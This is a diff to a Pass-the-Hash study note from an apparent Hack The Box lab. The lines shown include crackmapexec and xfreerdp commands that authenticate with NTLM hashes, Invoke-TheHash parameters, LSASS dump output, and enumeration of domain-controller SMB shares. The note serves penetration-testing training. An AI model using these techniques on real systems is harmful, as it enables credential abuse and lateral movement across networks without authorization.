@@ -53,10 +53,13 @@ NTLM    : 64F12CDDAA88057E06A81B54E73B949B
 * Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer
 - `Target` - Hostname or IP address of the target
 - `Username` - Username to use for authentication
-- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username
+- `Domain` - Domain to use for authentication
+	- This parameter is unnecessary with local accounts or when using the @domain after the username
 - `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format
 - `Command` - Command to execute on the target
 	- If a command is not specified, the function will check to see if the username and hash have access to WMI on the target
+
+#### Invoke-TheHash with SMB
 
 ```powershell
 PS c:\htb> cd C:\tools\Invoke-TheHash\
@@ -112,6 +115,7 @@ C:\Windows\system32>
 ```
 
 ## Pass the Hash with CrackMapExec (Linux)
+* Enumerate the target and get the computer names
 
 ```sh
 crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
@@ -182,3 +186,33 @@ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 * Domain account with administrative rights on a computer, can still use Pass the Hash with that computer
 *  [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167)
 
+## SMB in windows
+
+```powershell
+# LSASS DUMP
+User Name         : david
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+
+PS C:\> net view \\DC01\
+carlos            Disk
+david             Disk
+john              Disk
+julio             Disk
+linux01           Disk
+NETLOGON          Disk           Logon server share
+svc_workstations  Disk
+SYSVOL            Disk           Logon server share
+The command completed successfully.
+
+# SYNTAX: cd \\Logon Server\User
+PS C:\> cd \\DC01\david
+PS Microsoft.PowerShell.Core\FileSystem::\\DC01\david>
+
+
+PS C:\> get-smbshare
+C$           C:\                             Default share
+IPC$                                         Remote IPC
+ADMIN$       C:\Windows                      Remote Admin
+The command completed successfully
+```
